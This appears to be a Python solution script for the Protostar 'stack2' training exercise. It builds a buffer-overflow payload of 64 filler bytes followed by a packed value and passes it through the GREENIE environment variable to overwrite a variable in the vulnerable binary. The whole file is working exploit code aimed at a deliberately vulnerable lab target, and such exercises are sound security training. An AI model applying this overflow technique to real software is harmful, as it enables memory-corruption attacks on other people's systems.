#!/usr/bin/python

import os
import struct

payload =  "X"*0x40
payload += struct.pack("I", 0x0d0a0d0a)

os.environ["GREENIE"] = payload

os.system("/opt/protostar/bin/stack2 \"%s\"" % payload)
